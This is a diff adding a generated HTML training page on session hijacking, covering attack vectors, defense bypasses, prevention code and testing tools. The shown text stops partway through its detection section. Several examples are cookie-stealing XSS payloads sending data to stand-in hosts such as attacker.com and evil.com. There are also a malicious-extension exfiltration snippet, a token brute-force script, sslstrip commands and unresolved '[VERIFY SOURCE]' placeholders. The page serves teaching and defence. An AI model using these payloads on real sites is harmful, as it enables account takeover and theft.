@@ -1,0 +1,1444 @@
+<!-- GENERATED: follow sql-injection-learn-more.html template. Created by copilot script. -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Session Hijacking - Comprehensive Guide</title>
+    <link rel="stylesheet" href="../../src/web-assets/dashboard.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css">
+    <style>
+        .learn-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        
+        .back-nav {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 24px;
+            margin-bottom: 30px;
+            color: var(--primary-color);
+            text-decoration: none;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            transition: all 0.3s;
+            font-weight: 600;
+        }
+        
+        .back-nav:hover {
+            background-color: rgba(0, 255, 65, 0.1);
+            border-color: var(--primary-color);
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+        }
+        
+        .page-header {
+            text-align: center;
+            padding: 60px 20px;
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.1), rgba(13, 255, 146, 0.05));
+            border-radius: 12px;
+            margin-bottom: 50px;
+            border: 2px solid var(--primary-color);
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.2);
+        }
+        
+        .page-header h1 {
+            color: var(--primary-color);
+            font-size: 3rem;
+            margin-bottom: 15px;
+            text-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
+        }
+        
+        .page-header p {
+            color: var(--text-secondary);
+            font-size: 1.3rem;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .content-section {
+            background: var(--card-bg);
+            border-radius: 12px;
+            padding: 40px;
+            margin-bottom: 30px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 2px 10px rgba(0, 255, 65, 0.1);
+        }
+        
+        .content-section:hover {
+            box-shadow: 0 4px 20px rgba(0, 255, 65, 0.15);
+        }
+        
+        .content-section h2 {
+            color: var(--primary-color);
+            font-size: 2rem;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--primary-color);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .content-section h2:before {
+            content: "▸";
+            color: var(--secondary-color);
+            font-size: 2.5rem;
+        }
+        
+        .content-section h3 {
+            color: var(--secondary-color);
+            font-size: 1.5rem;
+            margin-top: 30px;
+            margin-bottom: 15px;
+        }
+        
+        .content-section h4 {
+            color: var(--primary-color);
+            font-size: 1.2rem;
+            margin-top: 25px;
+            margin-bottom: 12px;
+        }
+        
+        .content-section p {
+            color: var(--text-color);
+            line-height: 1.8;
+            margin-bottom: 15px;
+        }
+        
+        .content-section ul, .content-section ol {
+            margin-left: 25px;
+            margin-bottom: 20px;
+            color: var(--text-color);
+        }
+        
+        .content-section li {
+            margin-bottom: 12px;
+            line-height: 1.7;
+        }
+        
+        .content-section li strong {
+            color: var(--secondary-color);
+        }
+        
+        .content-section code {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 3px 8px;
+            border-radius: 4px;
+            color: var(--primary-color);
+            font-family: 'Courier New', 'Consolas', monospace;
+            font-size: 0.9em;
+            border: 1px solid var(--border-color);
+        }
+        
+        .content-section pre {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 25px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 25px 0;
+            border: 1px solid var(--primary-color);
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
+        }
+        
+        .content-section pre code {
+            background: none;
+            padding: 0;
+            border: none;
+            color: var(--text-color);
+            font-size: 0.95em;
+        }
+        
+        .content-section a {
+            color: var(--secondary-color);
+            text-decoration: none;
+            border-bottom: 1px dashed var(--secondary-color);
+            transition: all 0.3s;
+        }
+        
+        .content-section a:hover {
+            color: var(--primary-color);
+            border-bottom-color: var(--primary-color);
+        }
+        
+        .content-section strong {
+            color: var(--secondary-color);
+            font-weight: 600;
+        }
+        
+        .warning-box {
+            background: rgba(255, 49, 49, 0.1);
+            border-left: 4px solid #ff3131;
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 4px;
+        }
+        
+        .warning-box h4 {
+            color: #ff3131;
+            margin-top: 0;
+        }
+        
+        .success-box {
+            background: rgba(0, 255, 65, 0.1);
+            border-left: 4px solid var(--primary-color);
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 4px;
+        }
+        
+        .success-box h4 {
+            color: var(--primary-color);
+            margin-top: 0;
+        }
+        
+        .toc {
+            background: rgba(0, 255, 65, 0.05);
+            border: 2px solid var(--primary-color);
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 40px;
+        }
+        
+        .toc h3 {
+            color: var(--primary-color);
+            margin-top: 0;
+            margin-bottom: 20px;
+            font-size: 1.5rem;
+        }
+        
+        .toc ul {
+            list-style: none;
+            margin-left: 0;
+        }
+        
+        .toc li {
+            margin-bottom: 10px;
+        }
+        
+        .toc a {
+            color: var(--text-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px;
+            border-radius: 4px;
+            transition: all 0.3s;
+        }
+        
+        .toc a:hover {
+            background: rgba(0, 255, 65, 0.1);
+            color: var(--primary-color);
+            padding-left: 15px;
+        }
+        
+        .toc a:before {
+            content: "→";
+            color: var(--primary-color);
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="learn-container">
+        <a href="../index.html" class="back-nav">
+            <i class="fas fa-arrow-left"></i> Back to Attack Flows
+        </a>
+        
+        <div class="page-header">
+            <h1><i class="fas fa-user-secret"></i> Session Hijacking - Comprehensive Guide</h1>
+            <p>Complete guide to understanding, exploiting, and preventing session hijacking attacks</p>
+        </div>
+        
+        <div class="toc">
+            <h3><i class="fas fa-list"></i> Table of Contents</h3>
+            <ul>
+                <li><a href="#section-0">What is Session Hijacking?</a></li>
+                <li><a href="#section-1">How Session Hijacking Works</a></li>
+                <li><a href="#section-2">Advanced Attack Techniques</a></li>
+                <li><a href="#section-3">Defense Bypass Strategies</a></li>
+                <li><a href="#section-4">Prevention & Mitigation</a></li>
+                <li><a href="#section-5">Detection & Testing</a></li>
+                <li><a href="#section-6">Real-World Examples</a></li>
+                <li><a href="#section-7">Quick Reference</a></li>
+            </ul>
+        </div>
+        
+        <div class="content-section" id="section-0">
+            <h2>What is Session Hijacking?</h2>
+
+<p>Session Hijacking (also known as cookie hijacking or session sidejacking) is an attack where an attacker takes over a valid user session by stealing or predicting a valid session token. Once obtained, the attacker can impersonate the victim and gain unauthorized access to their account without needing credentials.</p>
+
+<ul>
+    <li><strong>Bypass authentication:</strong> Access accounts without knowing passwords</li>
+    <li><strong>Steal sensitive data:</strong> Access personal information, financial data, private messages</li>
+    <li><strong>Perform unauthorized actions:</strong> Make purchases, transfer funds, modify account settings</li>
+    <li><strong>Maintain persistent access:</strong> Continue accessing the account while session remains valid</li>
+    <li><strong>Lateral movement:</strong> Use hijacked sessions to access other systems or escalate privileges</li>
+    <li><strong>Identity theft:</strong> Impersonate users for malicious activities</li>
+</ul>
+
+<h3>Why is it Critical?</h3>
+<p>Session hijacking remains a critical security threat because:</p>
+
+<ul>
+    <li>It allows <strong>complete account takeover</strong> without credential theft</li>
+    <li>Often <strong>undetectable</strong> to both users and systems</li>
+    <li>Can be executed through <strong>multiple attack vectors</strong> (XSS, network sniffing, malware)</li>
+    <li>Exploits the <strong>fundamental trust model</strong> of web applications</li>
+    <li>Common in both <strong>legacy and modern applications</strong></li>
+    <li><strong>Session tokens are everywhere:</strong> Web apps, APIs, mobile apps, IoT devices</li>
+</ul>
+
+<div class="warning-box">
+    <h4><i class="fas fa-exclamation-triangle"></i> Critical Impact</h4>
+    <p>According to [VERIFY SOURCE], session hijacking is a primary vector in many data breaches. A stolen session token can provide the same level of access as stolen credentials, but is often harder to detect and easier to obtain through automated means.</p>
+</div>
+
+        </div>
+        
+        <div class="content-section" id="section-1">
+            <h2>How Session Hijacking Works</h2>
+
+<h3>Session Management Basics</h3>
+<p>Web applications maintain user sessions through tokens stored in cookies, URL parameters, or headers:</p>
+
+<pre><code class="language-http">HTTP/1.1 200 OK
+Set-Cookie: sessionid=a3fWa9dj8kL2mN5pQ7rS; Path=/; HttpOnly; Secure
+
+GET /dashboard HTTP/1.1
+Cookie: sessionid=a3fWa9dj8kL2mN5pQ7rS
+</code></pre>
+
+<h3>The Attack Flow</h3>
+
+<h4>Step 1: Session Token Theft</h4>
+<p>Attacker obtains the victim's session token through various methods:</p>
+
+<pre><code class="language-javascript">// XSS-based theft
+&lt;script&gt;
+  // Steal cookie and send to attacker
+  fetch('https://attacker.com/steal?cookie=' + document.cookie);
+&lt;/script&gt;
+
+// Alternative: Store in attacker-controlled storage
+&lt;script&gt;
+  new Image().src = 'http://evil.com/log.php?c=' + encodeURIComponent(document.cookie);
+&lt;/script&gt;
+</code></pre>
+
+<h4>Step 2: Session Replay</h4>
+<p>Attacker uses the stolen token to impersonate the victim:</p>
+
+<pre><code class="language-python"># Attacker's script
+import requests
+
+stolen_session = "a3fWa9dj8kL2mN5pQ7rS"
+
+cookies = {'sessionid': stolen_session}
+response = requests.get('https://victim-site.com/dashboard', cookies=cookies)
+
+# ✅ Attacker is now logged in as victim!
+</code></pre>
+
+<h3>Attack Vectors</h3>
+
+<h4>1. Cross-Site Scripting (XSS)</h4>
+<p>Most common method - inject malicious JavaScript to steal cookies:</p>
+
+<pre><code class="language-html">&lt;!-- Stored XSS in forum post --&gt;
+&lt;script&gt;
+  document.location='http://attacker.com/steal.php?c='+document.cookie;
+&lt;/script&gt;
+
+&lt;!-- Reflected XSS in search parameter --&gt;
+http://vulnerable-site.com/search?q=&lt;script&gt;fetch('//evil.com?'+document.cookie)&lt;/script&gt;
+</code></pre>
+
+<h4>2. Network Sniffing</h4>
+<p>Intercept unencrypted HTTP traffic on shared networks:</p>
+
+<pre><code class="language-bash"># Attacker on same WiFi network
+tcpdump -i wlan0 -A | grep "Cookie:"
+
+# Using Wireshark to capture session tokens
+# Filter: http.cookie contains "session"
+</code></pre>
+
+<h4>3. Session Fixation</h4>
+<p>Force victim to use attacker-controlled session ID:</p>
+
+<pre><code class="language-html">&lt;!-- Attacker sends link to victim --&gt;
+http://vulnerable-site.com/login?sessionid=ATTACKER_CONTROLLED_ID
+
+&lt;!-- After victim logs in, attacker uses the same session ID --&gt;
+</code></pre>
+
+<h4>4. Man-in-the-Middle (MITM)</h4>
+<p>Intercept communication between client and server:</p>
+
+<ul>
+    <li>ARP spoofing on local networks</li>
+    <li>DNS spoofing to redirect traffic</li>
+    <li>SSL stripping to downgrade HTTPS to HTTP</li>
+    <li>Rogue WiFi access points</li>
+</ul>
+
+<h4>5. Malware/Browser Extensions</h4>
+<pre><code class="language-javascript">// Malicious browser extension
+chrome.cookies.getAll({domain: "target-site.com"}, function(cookies) {
+  fetch('https://attacker.com/exfil', {
+    method: 'POST',
+    body: JSON.stringify(cookies)
+  });
+});
+</code></pre>
+
+<h4>6. Session Side-jacking (Firesheep-style)</h4>
+<p>Capture session cookies from unencrypted traffic on public WiFi [VERIFY SOURCE - Firesheep tool from 2010].</p>
+
+        </div>
+        
+        <div class="content-section" id="section-2">
+            <h2>Advanced Attack Techniques</h2>
+
+<h3>1. XSS-Based Cookie Theft</h3>
+
+<h4>DOM-based Exfiltration</h4>
+<pre><code class="language-javascript">// Bypass HttpOnly using alternative storage
+&lt;script&gt;
+  // Steal localStorage tokens
+  const token = localStorage.getItem('authToken');
+  fetch('https://attacker.com/steal?token=' + token);
+  
+  // Steal sessionStorage
+  const session = sessionStorage.getItem('session');
+  navigator.sendBeacon('https://attacker.com/log', session);
+&lt;/script&gt;
+</code></pre>
+
+<h4>XSS with Session Riding</h4>
+<pre><code class="language-javascript">// Instead of stealing cookie, perform actions on victim's behalf
+&lt;script&gt;
+  fetch('/api/transfer', {
+    method: 'POST',
+    credentials: 'include',  // Include session cookie
+    body: JSON.stringify({
+      to: 'attacker_account',
+      amount: 10000
+    })
+  });
+&lt;/script&gt;
+</code></pre>
+
+<h3>2. Session Token Prediction</h3>
+
+<h4>Weak Token Generation</h4>
+<pre><code class="language-python"># VULNERABLE: Predictable session IDs
+session_id = str(user_id) + str(int(time.time()))
+# Example: "12341700000000" - easy to guess!
+
+# VULNERABLE: Sequential IDs
+session_id = str(last_session_id + 1)
+
+# ✅ SECURE: Cryptographically random
+import secrets
+session_id = secrets.token_urlsafe(32)
+</code></pre>
+
+<h4>Brute Force Attack</h4>
+<pre><code class="language-python">import requests
+import string
+import itertools
+
+# Try all possible short session IDs
+for token in itertools.product(string.ascii_letters + string.digits, repeat=6):
+    session_token = ''.join(token)
+    cookies = {'SESSIONID': session_token}
+    response = requests.get('https://target.com/profile', cookies=cookies)
+    
+    if response.status_code == 200:
+        print(f"Valid session found: {session_token}")
+        break
+</code></pre>
+
+<h3>3. Session Fixation Advanced</h3>
+
+<pre><code class="language-html">&lt;!-- Attacker sets cookie via subdomain --&gt;
+&lt;script&gt;
+  document.cookie = "sessionid=ATTACKER_ID; domain=.vulnerable-site.com";
+  window.location = "https://vulnerable-site.com/login";
+&lt;/script&gt;
+
+&lt;!-- Or via URL parameter --&gt;
+&lt;a href="http://bank.com/login?session=ATTACKER_SESSION"&gt;
+  Click here to login to your bank
+&lt;/a&gt;
+</code></pre>
+
+<h3>4. Cross-Site Request Forgery (CSRF) + Session Hijacking</h3>
+<pre><code class="language-html">&lt;!-- Combine CSRF with session theft --&gt;
+&lt;img src="http://vulnerable-site.com/transfer?to=attacker&amount=1000" /&gt;
+
+&lt;!-- With XSS to bypass CSRF tokens --&gt;
+&lt;script&gt;
+  fetch('/get-csrf-token')
+    .then(r => r.json())
+    .then(data => {
+      fetch('/transfer', {
+        method: 'POST',
+        headers: {'X-CSRF-Token': data.token},
+        body: JSON.stringify({to: 'attacker', amount: 10000})
+      });
+    });
+&lt;/script&gt;
+</code></pre>
+
+<h3>5. Session Token Leakage</h3>
+
+<h4>Referer Header Leakage</h4>
+<pre><code class="language-html">&lt;!-- Session in URL gets leaked via Referer --&gt;
+http://site.com/dashboard?session=abc123
+
+&lt;!-- User clicks external link --&gt;
+&lt;a href="http://external-site.com"&gt;Click here&lt;/a&gt;
+
+&lt;!-- Referer header sent to external site: --&gt;
+Referer: http://site.com/dashboard?session=abc123
+</code></pre>
+
+<h4>Browser History/Cache</h4>
+<ul>
+    <li>Sessions in URL parameters stored in browser history</li>
+    <li>Cached pages containing session tokens</li>
+    <li>Autocomplete leaking session data</li>
+</ul>
+
+<h3>6. Session Donation Attack</h3>
+<pre><code class="language-javascript">// Attacker creates account and donates their session to victim
+// Victim unknowingly uses attacker's session
+// Attacker can see all victim's actions in their account
+
+// Example: Attacker sets up session fixation
+document.cookie = "session=ATTACKER_SESSION; domain=.target.com";
+</code></pre>
+
+        </div>
+        
+        <div class="content-section" id="section-3">
+            <h2>Defense Bypass Strategies</h2>
+
+<h3>Bypassing HttpOnly Flag</h3>
+
+<h4>1. XSS-based Workarounds</h4>
+<pre><code class="language-javascript">// Can't read HttpOnly cookie, but can still make requests
+&lt;script&gt;
+  // Session riding - perform actions without stealing cookie
+  fetch('/api/change-email', {
+    method: 'POST',
+    credentials: 'include',  // Browser automatically includes HttpOnly cookie
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({email: 'attacker@evil.com'})
+  });
+&lt;/script&gt;
+</code></pre>
+
+<h4>2. Network-Level Capture</h4>
+<pre><code>// HttpOnly prevents JavaScript access, but not network sniffing
+// Use Wireshark, tcpdump, or MITM proxy to capture cookies in transit
+</code></pre>
+
+<h3>Bypassing Secure Flag</h3>
+
+<h4>SSL Stripping Attack</h4>
+<pre><code class="language-bash"># Attacker performs MITM and downgrades HTTPS to HTTP
+# Tool: sslstrip
+sslstrip -l 8080
+
+# iptables redirect
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+# Now session cookies are transmitted over HTTP even with Secure flag
+</code></pre>
+
+<h3>Bypassing SameSite Cookie Protection</h3>
+
+<h4>1. SameSite=Lax Bypass</h4>
+<pre><code class="language-html">&lt;!-- SameSite=Lax allows cookies on top-level navigation --&gt;
+&lt;!-- Attacker creates malicious site: --&gt;
+&lt;a href="https://vulnerable-site.com/transfer?to=attacker&amount=1000"&gt;
+  Click here for free prize!
+&lt;/a&gt;
+
+&lt;!-- Cookie is sent with GET request --&gt;
+</code></pre>
+
+<h4>2. Subdomain Takeover</h4>
+<pre><code class="language-javascript">// If SameSite is set on parent domain
+// Attacker takes over subdomain (old.company.com)
+// Can set cookies for parent domain
+
+// From compromised subdomain:
+document.cookie = "session=ATTACKER_SESSION; domain=.company.com";
+</code></pre>
+
+<h3>Bypassing IP Binding</h3>
+
+<h4>1. Same Network Attack</h4>
+<pre><code>// If session tied to IP address
+// Attacker on same corporate network/NAT shares external IP
+// Session hijacking works from same IP range
+</code></pre>
+
+<h4>2. Proxy Spoofing</h4>
+<pre><code class="language-python"># Spoof X-Forwarded-For header
+headers = {
+    'Cookie': 'session=STOLEN_TOKEN',
+    'X-Forwarded-For': '192.168.1.100'  # Victim's IP
+}
+requests.get('https://target.com/api', headers=headers)
+</code></pre>
+
+<h3>Bypassing User-Agent Binding</h3>
+<pre><code class="language-python"># Simply replicate victim's User-Agent
+headers = {
+    'Cookie': 'session=STOLEN_TOKEN',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)...'
+}
+</code></pre>
+
+<h3>Bypassing Session Timeout</h3>
+
+<h4>Keep-Alive Attack</h4>
+<pre><code class="language-python">import requests
+import time
+
+stolen_session = "abc123xyz"
+
+while True:
+    # Keep session alive by making periodic requests
+    requests.get('https://target.com/keep-alive', 
+                 cookies={'session': stolen_session})
+    time.sleep(60)  # Every minute
+</code></pre>
+
+        </div>
+        
+        <div class="content-section" id="section-4">
+            <h2>Prevention & Mitigation</h2>
+
+<h3>1. Secure Cookie Configuration</h3>
+<p>✅ <strong>PRIMARY DEFENSE FOR WEB APPLICATIONS</strong></p>
+
+<h4>Essential Cookie Flags</h4>
+<pre><code class="language-python"># Python Flask
+from flask import session
+app.config['SESSION_COOKIE_HTTPONLY'] = True
+app.config['SESSION_COOKIE_SECURE'] = True
+app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
+
+# Set-Cookie header:
+Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
+</code></pre>
+
+<pre><code class="language-javascript">// Node.js Express
+const session = require('express-session');
+app.use(session({
+  secret: 'your-secret-key',
+  cookie: {
+    httpOnly: true,     // Prevent JavaScript access
+    secure: true,       // Only send over HTTPS
+    sameSite: 'strict', // Prevent CSRF
+    maxAge: 3600000     // 1 hour timeout
+  }
+}));
+</code></pre>
+
+<pre><code class="language-php">// PHP
+session_start([
+    'cookie_httponly' => true,
+    'cookie_secure' => true,
+    'cookie_samesite' => 'Strict'
+]);
+
+// Or set in php.ini:
+session.cookie_httponly = 1
+session.cookie_secure = 1
+session.cookie_samesite = Strict
+</code></pre>
+
+<h4>Cookie Flag Explanation</h4>
+<ul>
+    <li><strong>HttpOnly:</strong> Prevents JavaScript access to cookies (mitigates XSS-based theft)</li>
+    <li><strong>Secure:</strong> Cookie only sent over HTTPS (prevents network sniffing)</li>
+    <li><strong>SameSite=Strict:</strong> Cookie not sent on cross-site requests (prevents CSRF)</li>
+    <li><strong>SameSite=Lax:</strong> Cookie sent on top-level navigation only (balanced security)</li>
+</ul>
+
+<h3>2. Strong Session Token Generation</h3>
+
+<pre><code class="language-python"># ✅ GOOD: Cryptographically secure random tokens
+import secrets
+session_token = secrets.token_urlsafe(32)  # 256 bits of entropy
+
+# ✅ GOOD: UUID v4
+import uuid
+session_token = str(uuid.uuid4())
+
+# ❌ BAD: Predictable tokens
+import random
+session_token = str(random.randint(1000, 9999))  # Only 9000 possibilities!
+
+# ❌ BAD: Time-based
+import time
+session_token = str(time.time())  # Predictable
+</code></pre>
+
+<h3>3. Session Regeneration</h3>
+<p>Generate new session ID after privilege changes:</p>
+
+<pre><code class="language-python"># Python Flask - regenerate on login
+from flask import session
+
+@app.route('/login', methods=['POST'])
+def login():
+    if authenticate(username, password):
+        # Clear old session
+        session.clear()
+        
+        # Create new session (new ID generated automatically)
+        session['user_id'] = user.id
+        session['logged_in'] = True
+        
+        return redirect('/dashboard')
+</code></pre>
+
+<pre><code class="language-php">// PHP - regenerate session ID
+session_start();
+
+if (authenticate($_POST['username'], $_POST['password'])) {
+    // Generate new session ID
+    session_regenerate_id(true);
+    
+    $_SESSION['user_id'] = $user->id;
+    $_SESSION['logged_in'] = true;
+}
+</code></pre>
+
+<h3>4. Session Binding</h3>
+
+<h4>Bind Session to User Context</h4>
+<pre><code class="language-python">import hashlib
+
+def create_session(user_id, request):
+    # Create fingerprint of user environment
+    fingerprint = hashlib.sha256(
+        f"{request.user_agent}"
+        f"{request.headers.get('Accept-Language')}"
+        f"{get_client_ip(request)[:10]}"  # First 3 octets only
+        .encode()
+    ).hexdigest()
+    
+    session_data = {
+        'user_id': user_id,
+        'fingerprint': fingerprint,
+        'created_at': time.time()
+    }
+    
+    return session_data
+
+def validate_session(session_data, request):
+    # Recreate fingerprint
+    current_fingerprint = hashlib.sha256(
+        f"{request.user_agent}"
+        f"{request.headers.get('Accept-Language')}"
+        f"{get_client_ip(request)[:10]}"
+        .encode()
+    ).hexdigest()
+    
+    # Compare fingerprints
+    if current_fingerprint != session_data['fingerprint']:
+        raise Exception("Session fingerprint mismatch - possible hijacking!")
+</code></pre>
+
+<div class="warning-box">
+    <h4><i class="fas fa-exclamation-triangle"></i> Binding Limitations</h4>
+    <p><strong>Note:</strong> Strict IP binding can break legitimate use cases (mobile users switching networks, corporate proxies, VPNs). Use partial IP matching or combine multiple weak signals instead of strict binding [VERIFY SOURCE].</p>
+</div>
+
+<h3>5. Session Timeout & Rotation</h3>
+
+<pre><code class="language-python"># Implement idle timeout
+SESSION_TIMEOUT = 30 * 60  # 30 minutes
+
+def check_session_timeout(session):
+    last_activity = session.get('last_activity', 0)
+    
+    if time.time() - last_activity > SESSION_TIMEOUT:
+        session.clear()
+        raise Exception("Session expired due to inactivity")
+    
+    # Update last activity
+    session['last_activity'] = time.time()
+
+# Absolute timeout
+SESSION_MAX_AGE = 24 * 60 * 60  # 24 hours
+
+def check_max_age(session):
+    created_at = session.get('created_at', 0)
+    
+    if time.time() - created_at > SESSION_MAX_AGE:
+        session.clear()
+        raise Exception("Session expired - please login again")
+</code></pre>
+
+<h3>6. HTTPS Enforcement</h3>
+
+<pre><code class="language-python"># Force HTTPS redirect
+@app.before_request
+def force_https():
+    if not request.is_secure and app.env == "production":
+        url = request.url.replace("http://", "https://", 1)
+        return redirect(url, code=301)
+</code></pre>
+
+<pre><code class="language-nginx"># Nginx HTTPS redirect
+server {
+    listen 80;
+    server_name example.com;
+    return 301 https://$server_name$request_uri;
+}
+
+# Enable HSTS
+add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
+</code></pre>
+
+<h3>7. XSS Prevention</h3>
+<p>Since XSS is a primary vector for session theft:</p>
+
+<pre><code class="language-python"># Content Security Policy
+@app.after_request
+def set_csp(response):
+    response.headers['Content-Security-Policy'] = \
+        "default-src 'self'; script-src 'self'; object-src 'none';"
+    return response
+
+# Input sanitization
+import bleach
+
+def sanitize_input(user_input):
+    # Remove all HTML tags
+    clean_input = bleach.clean(user_input, tags=[], strip=True)
+    return clean_input
+
+# Output encoding
+from markupsafe import escape
+
+@app.route('/profile')
+def profile():
+    username = escape(user.username)
+    return f"&lt;h1&gt;Welcome {username}&lt;/h1&gt;"
+</code></pre>
+
+<h3>8. Logout Functionality</h3>
+
+<pre><code class="language-python"># Proper session destruction
+@app.route('/logout')
+def logout():
+    # Server-side: Delete session from database
+    db.sessions.delete({'session_id': session['id']})
+    
+    # Client-side: Clear session cookie
+    session.clear()
+    
+    # Expire cookie immediately
+    response = make_response(redirect('/login'))
+    response.set_cookie('session', '', expires=0)
+    
+    return response
+</code></pre>
+
+<h3>9. Token-Based Authentication (Alternative)</h3>
+
+<pre><code class="language-python"># JWT with short expiration
+import jwt
+from datetime import datetime, timedelta
+
+def create_jwt_token(user_id):
+    payload = {
+        'user_id': user_id,
+        'exp': datetime.utcnow() + timedelta(minutes=15),  # Short-lived
+        'iat': datetime.utcnow()
+    }
+    
+    token = jwt.encode(payload, SECRET_KEY, algorithm='HS256')
+    return token
+
+# Refresh token pattern
+def create_tokens(user_id):
+    access_token = create_jwt_token(user_id)  # 15 min
+    refresh_token = secrets.token_urlsafe(32)  # Store in DB
+    
+    return {
+        'access_token': access_token,
+        'refresh_token': refresh_token
+    }
+</code></pre>
+
+        </div>
+        
+        <div class="content-section" id="section-5">
+            <h2>Detection & Testing</h2>
+
+<h3>Manual Testing Techniques</h3>
+
+<h4>1. Cookie Analysis</h4>
+<pre><code class="language-bash"># Check cookie flags in browser DevTools
+# Console:
+document.cookie
+
+# Network tab:
+# Look for Set-Cookie headers
+# Verify: HttpOnly, Secure, SameSite flags
+</code></pre>
+
+<h4>2. Session Token Entropy Test</h4>
+<pre><code class="language-python"># Collect multiple session tokens and analyze
+import math
+from collections import Counter
+
+def calculate_entropy(token):
+    # Calculate Shannon entropy
+    counter = Counter(token)
+    length = len(token)
+    
+    entropy = -sum(
+        (count/length) * math.log2(count/length) 
+        for count in counter.values()
+    )
+    
+    return entropy
+
+# Test tokens
+tokens = [
+    "a3fWa9dj8kL2mN5pQ7rS",  # Good: high entropy
+    "user123session456",      # Bad: predictable
+    "12345678"                # Bad: sequential
+]
+
+for token in tokens:
+    entropy = calculate_entropy(token)
+    print(f"Token: {token}")
+    print(f"Entropy: {entropy:.2f} bits")
+    print(f"Assessment: {'WEAK' if entropy < 4 else 'STRONG'}\n")
+</code></pre>
+
+<h4>3. Session Fixation Test</h4>
+<pre><code># Test steps:
+1. Get session ID before login: SESS=abc123
+2. Login with credentials
+3. Check if session ID changed after login
+4. If same (SESS=abc123), vulnerable to session fixation!
+
+# Automated test:
+curl -c cookies.txt http://target.com/
+# Note session ID
+
+curl -b cookies.txt -c cookies.txt -d "user=test&pass=test" http://target.com/login
+# Check if session ID changed
+</code></pre>
+
+<h4>4. XSS to Session Theft Test</h4>
+<pre><code class="language-javascript">// Test in browser console (on sites you own/have permission)
+&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+
+// If alert shows cookies, they're not HttpOnly
+// If nothing appears, HttpOnly is properly set
+</code></pre>
+
+<h4>5. Cross-Site Session Riding</h4>
+<pre><code class="language-html">&lt;!-- Create test.html on different domain --&gt;
+&lt;html&gt;
+&lt;body&gt;
+  &lt;h1&gt;CSRF/Session Test&lt;/h1&gt;
+  &lt;script&gt;
+    // Try to make request to target site
+    fetch('https://target-site.com/api/sensitive', {
+      credentials: 'include'
+    }).then(r => console.log('Request succeeded'))
+      .catch(e => console.log('Request failed'));
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!-- If request succeeds, SameSite not properly configured --&gt;
+</code></pre>
+
+<h3>Automated Testing Tools</h3>
+
+<h4>Burp Suite</h4>
+<p>Comprehensive testing capabilities:</p>
+
+<ul>
+    <li><strong>Sequencer:</strong> Analyze session token randomness</li>
+    <li><strong>Repeater:</strong> Test session hijacking manually</li>
+    <li><strong>Scanner:</strong> Detect missing security flags</li>
+    <li><strong>Intruder:</strong> Brute force weak session tokens</li>
+</ul>
+
+<pre><code class="language-bash"># Burp Suite Sequencer usage:
+1. Proxy > HTTP History > Find session token
+2. Right-click > Send to Sequencer
+3. Select token parameter
+4. Start live capture (minimum 100 tokens)
+5. Analyze results for randomness
+</code></pre>
+
+<h4>OWASP ZAP</h4>
+<pre><code class="language-bash"># Automated scan
+zap-cli quick-scan --self-contained \
+  --start-options '-config api.disablekey=true' \
+  https://target-site.com
+
+# Check for:
+# - Missing HttpOnly flag
+# - Missing Secure flag
+# - Weak session tokens
+# - Session fixation
+</code></pre>
+
+<h4>Custom Python Scanner</h4>
+<pre><code class="language-python">import requests
+import re
+
+def test_session_security(url):
+    print(f"Testing: {url}")
+    
+    # Test 1: Check cookie flags
+    response = requests.get(url)
+    cookies = response.cookies
+    
+    for cookie in cookies:
+        print(f"\nCookie: {cookie.name}")
+        print(f"  HttpOnly: {cookie.has_nonstandard_attr('HttpOnly')}")
+        print(f"  Secure: {cookie.secure}")
+        
+        # Check for session tokens in response
+        if re.search(r'sessionid|session|token', cookie.name, re.I):
+            if not cookie.has_nonstandard_attr('HttpOnly'):
+                print("  ⚠️  WARNING: Session cookie without HttpOnly!")
+            if not cookie.secure:
+                print("  ⚠️  WARNING: Session cookie without Secure flag!")
+    
+    # Test 2: Check session fixation
+    session1 = requests.Session()
+    resp1 = session1.get(url)
+    cookie_before = session1.cookies.get('sessionid')
+    
+    # Simulate login
+    resp2 = session1.post(f"{url}/login", 
+                          data={'user': 'test', 'pass': 'test'})
+    cookie_after = session1.cookies.get('sessionid')
+    
+    if cookie_before == cookie_after:
+        print("\n⚠️  WARNING: Session ID not regenerated after login!")
+        print("   Vulnerable to session fixation attack")
+
+# Usage
+test_session_security('https://example.com')
+</code></pre>
+
+<h4>Nikto</h4>
+<pre><code class="language-bash"># Web server scanner
+nikto -h https://target-site.com -Tuning 9
+
+# Check output for:
+# - Missing security headers
+# - Cookie security issues
+# - XSS vulnerabilities (leading to session theft)
+</code></pre>
+
+<h3>Real-Time Detection & Monitoring</h3>
+
+<h4>Anomaly Detection</h4>
